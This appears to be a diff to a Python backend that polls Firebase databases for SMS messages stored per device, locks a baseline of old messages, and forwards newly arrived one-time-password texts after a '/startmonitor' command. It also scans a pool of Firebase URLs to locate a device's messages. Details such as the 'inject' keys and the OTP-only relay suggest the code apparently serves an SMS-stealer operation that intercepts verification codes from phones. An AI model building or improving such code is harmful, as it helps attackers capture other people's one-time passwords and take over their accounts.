@@ -110,6 +110,8 @@ INJECT_DONE_META_KEY = "firebase_sms_inject_done"
 BASELINE_META_KEY = "firebase_sms_baseline"
 BASELINE_AT_META_KEY = "firebase_sms_baseline_at"
 BASELINE_READY_META_KEY = "firebase_sms_baseline_ready"
+BASELINE_SHALLOW_SNAPSHOT_DONE_META_KEY = "firebase_sms_baseline_shallow_done"
+BASELINE_POLL_TAIL_LOCK_META_KEY = "firebase_sms_baseline_poll_lock"
 MESSAGES_HIGH_WATER_META = "firebase_messages_high_water"
 SMS_FIREBASE_URL_META_KEY = "firebase_sms_poll_url"
 POOL_SMS_SCAN_DONE_META_KEY = "firebase_pool_sms_scan_done"
@@ -173,13 +175,34 @@ async def _messages_path_exists(
     *,
     timeout: float,
 ) -> bool:
+    """Detect messages/{device} without limitToLast-only GET (Firebase returns 400)."""
     root = firebase_root_url(firebase_url)
-    url = f"{root}/messages/{device_id}.json?limitToLast=1"
+    shallow_url = f"{root}/messages/{device_id}.json?shallow=true"
     try:
-        data = await _fetch_json(url, timeout=timeout)
+        data = await _fetch_json(shallow_url, timeout=timeout)
+        if isinstance(data, dict) and data:
+            return True
     except httpx.HTTPError:
+        pass
+    keyed_url = (
+        f"{root}/messages/{device_id}.json"
+        f'?orderBy=%22%24key%22&limitToLast=1'
+    )
+    try:
+        data = await _fetch_json(keyed_url, timeout=timeout)
+    except httpx.HTTPError:
+        try:
+            data = await _fetch_json(
+                f"{root}/messages/{device_id}.json",
+                timeout=timeout,
+            )
+        except httpx.HTTPError:
+            return False
+    if data is None:
         return False
-    return isinstance(data, dict) and bool(data)
+    if isinstance(data, dict):
+        return bool(data)
+    return bool(data)
 
 
 async def _scan_pool_for_device_messages(
@@ -269,14 +292,15 @@ async def resolve_firebase_url_for_otp_poll(
             device_id,
             skip=set(candidates),
         )
-        meta[POOL_SMS_SCAN_DONE_META_KEY] = True
         if pool_hit:
+            meta[POOL_SMS_SCAN_DONE_META_KEY] = True
             device.firebase_source_url = pool_hit
             meta[SMS_FIREBASE_URL_META_KEY] = pool_hit
             meta[OTP_EMPTY_POLL_STREAK_META_KEY] = 0
             _save_meta(device, meta)
             db.commit()
             return pool_hit
+        meta.pop(POOL_SMS_SCAN_DONE_META_KEY, None)
         _save_meta(device, meta)
         db.commit()
 
@@ -285,6 +309,18 @@ async def resolve_firebase_url_for_otp_poll(
         device_id,
         len(candidates),
     )
+    if candidates:
+        url = normalize_firebase_url(candidates[0])
+        meta = _meta_dict(device)
+        meta[SMS_FIREBASE_URL_META_KEY] = url
+        _save_meta(device, meta)
+        db.commit()
+        logger.warning(
+            "OTP poll: probe miss device=%s — polling candidate url=%s",
+            device_id,
+            url,
+        )
+        return url
     return None
 
 
@@ -314,6 +350,26 @@ def _save_meta(device: Device, meta: dict[str, Any]) -> None:
 
     device.device_meta = json.dumps(meta)
     flag_modified(device, "device_meta")
+
+
+def preserve_sms_monitor_meta_in_device_json(
+    existing: dict[str, Any] | None,
+    fresh: dict[str, Any],
+) -> dict[str, Any]:
+    """Device Firebase sync must not wipe OTP baseline / seen / high_water in device_meta."""
+    merged = dict(fresh)
+    if not isinstance(existing, dict):
+        return merged
+    for key, value in existing.items():
+        if (
+            key.startswith("firebase_sms_")
+            or key.startswith("firebase_messages_")
+            or key.startswith("firebase_pool_")
+            or key.startswith("otp_")
+            or key in {SMS_FIREBASE_URL_META_KEY, SMS_PATHS_META_KEY}
+        ):
+            merged[key] = value
+    return merged
 
 
 def get_seen_sms_keys(device: Device) -> set[str]:
@@ -352,6 +408,14 @@ def mark_sms_keys_seen(device: Device, keys: set[str]) -> None:
         seen = seen[-MAX_SEEN_KEYS:]
     meta[SEEN_META_KEY] = seen
     _save_meta(device, meta)
+
+
+def _baseline_shallow_snapshot_done(device: Device, profile: MonitorProfile) -> bool:
+    started = _started_iso(profile.started_at)
+    if not started:
+        return False
+    meta = _meta_dict(device)
+    return meta.get(BASELINE_SHALLOW_SNAPSHOT_DONE_META_KEY) == started
 
 
 def get_baseline_sms_keys(device: Device) -> set[str]:
@@ -398,6 +462,8 @@ def clear_sms_baseline(device: Device) -> None:
     meta.pop(SMS_FIREBASE_URL_META_KEY, None)
     meta.pop(POOL_SMS_SCAN_DONE_META_KEY, None)
     meta.pop(OTP_EMPTY_POLL_STREAK_META_KEY, None)
+    meta.pop(BASELINE_SHALLOW_SNAPSHOT_DONE_META_KEY, None)
+    meta.pop(BASELINE_POLL_TAIL_LOCK_META_KEY, None)
     _save_meta(device, meta)
 
 
@@ -449,7 +515,6 @@ def _monitoring_baseline_done(device: Device, profile: MonitorProfile) -> bool:
     return (
         meta.get(BASELINE_AT_META_KEY) == started
         and meta.get(BASELINE_READY_META_KEY) is True
-        and int(meta.get(MESSAGES_HIGH_WATER_META) or 0) > 0
     )
 
 
@@ -553,10 +618,16 @@ def _should_deliver_otp_record(
     device: Device,
     profile: MonitorProfile,
 ) -> bool:
-    """After baseline: any unseen message in tail (old SMS already marked seen at start)."""
+    """Only SMS after /startmonitor — push_id strictly above baseline high_water."""
     if not _monitoring_baseline_done(device, profile):
         return False
-    return _record_dedup_key(record) not in get_seen_sms_keys(device)
+    if _record_dedup_key(record) in get_seen_sms_keys(device):
+        return False
+    push_id = _message_push_id(record)
+    high_water = _messages_high_water(device)
+    if push_id is not None and high_water > 0:
+        return push_id > high_water
+    return _record_is_after_monitoring_start(record, profile)
 
 
 def _looks_like_incoming_sms(sender: str, body: str) -> bool:
@@ -1312,6 +1383,8 @@ async def snapshot_firebase_sms_seen(
     db=None,
 ) -> int:
     """On monitoring start — mark every existing Firebase SMS as baseline (ignored)."""
+    if _baseline_shallow_snapshot_done(device, profile):
+        return 0
     if db is not None:
         firebase_url = await resolve_firebase_url_for_otp_poll(profile, device, db)
     else:
@@ -1346,6 +1419,11 @@ async def snapshot_firebase_sms_seen(
         return 0
 
     _set_baseline_high_water(device, high_water, profile.started_at)
+    meta = _meta_dict(device)
+    started = _started_iso(profile.started_at)
+    if started:
+        meta[BASELINE_SHALLOW_SNAPSHOT_DONE_META_KEY] = started
+        _save_meta(device, meta)
     if db is not None:
         db.commit()
     logger.info(
@@ -1368,6 +1446,8 @@ def mark_monitoring_baseline_started(device: Device, profile: MonitorProfile, db
     meta.pop(SMS_FIREBASE_URL_META_KEY, None)
     meta.pop(POOL_SMS_SCAN_DONE_META_KEY, None)
     meta.pop(OTP_EMPTY_POLL_STREAK_META_KEY, None)
+    meta.pop(BASELINE_SHALLOW_SNAPSHOT_DONE_META_KEY, None)
+    meta.pop(BASELINE_POLL_TAIL_LOCK_META_KEY, None)
     if profile.started_at:
         meta[BASELINE_AT_META_KEY] = _started_iso(profile.started_at)
     _save_meta(device, meta)
@@ -1483,8 +1563,13 @@ async def _ensure_messages_high_water(
     firebase_url: str,
     db,
 ) -> int:
-    """First poll cycle — lock current Firebase tail without delivering backlog."""
+    """One-shot incoming tail lock — never re-scan shallow keys on every poll."""
     if _monitoring_baseline_done(device, profile):
+        return _messages_high_water(device)
+
+    started = _started_iso(profile.started_at)
+    meta = _meta_dict(device)
+    if started and meta.get(BASELINE_POLL_TAIL_LOCK_META_KEY) == started:
         return _messages_high_water(device)
 
     root = firebase_root_url(firebase_url)
@@ -1504,27 +1589,24 @@ async def _ensure_messages_high_water(
         if push_ids:
             high_water = max(push_ids)
 
-    shallow: set[str] = set()
     try:
-        shallow = await _fetch_messages_shallow_keys(root, device_id, fetch_timeout)
         junk = await _fetch_outgoing_message_keys(root, device_id, fetch_timeout)
-        if shallow and high_water > 0:
-            mark_sms_keys_seen(
-                device,
-                _old_message_keys_for_baseline(shallow, high_water) | junk,
-            )
-        elif junk:
+        if junk:
             mark_sms_keys_seen(device, junk)
     except Exception:
-        shallow = set()
+        pass
 
     _set_baseline_high_water(device, high_water, profile.started_at)
+    if started:
+        meta = _meta_dict(device)
+        meta[BASELINE_POLL_TAIL_LOCK_META_KEY] = started
+        _save_meta(device, meta)
     db.commit()
     logger.info(
-        "OTP baseline locked device=%s high_water=%s old_seen=%s",
+        "OTP baseline tail lock device=%s high_water=%s (shallow=%s)",
         device_id,
         high_water,
-        len(_old_message_keys_for_baseline(shallow, high_water)) if shallow and high_water else 0,
+        _baseline_shallow_snapshot_done(device, profile),
     )
     return high_water
 
@@ -1586,8 +1668,16 @@ async def _poll_messages_otp_only(
         logger.warning("OTP poll empty device=%s url=%s", device_id, firebase_url)
 
     candidates: list[dict[str, Any]] = []
+    poll_high_water = _messages_high_water(device)
     for record in records:
         if not _should_deliver_otp_record(record, device, profile):
+            push_id = _message_push_id(record)
+            if (
+                push_id is not None
+                and poll_high_water > 0
+                and push_id <= poll_high_water
+            ):
+                mark_sms_keys_seen(device, {_record_dedup_key(record)})
             continue
         sender = str(record.get("sender") or "Unknown")
         body = str(record.get("message") or "")
@@ -1664,6 +1754,8 @@ async def _poll_messages_otp_only(
         )
         mark_sms_keys_seen(device, {dedup})
         mark_inject_done_keys(device, {dedup})
+        if push_id is not None:
+            _bump_messages_high_water(device, push_id)
         delivered += 1
         db.commit()
         logger.info(
